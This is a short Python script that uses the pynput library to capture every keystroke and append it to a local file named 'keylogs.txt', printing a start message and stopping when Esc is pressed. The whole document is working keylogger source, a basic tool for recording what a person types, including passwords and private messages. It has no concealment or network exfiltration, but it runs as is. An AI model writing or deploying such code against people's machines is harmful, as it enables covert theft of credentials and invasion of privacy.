from pynput import keyboard

def on_press(key):
    try:
        with open('keylogs.txt', 'a') as f:
            if hasattr(key, 'char'):
                f.write(key.char)
            else:
                f.write(str(key))
    except Exception as e:
        print("An error occurred:", str(e))

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    try:
        print("Started listening for keystrokes...")
        listener.join()
    except Exception as e:
        print("An error occurred:", str(e))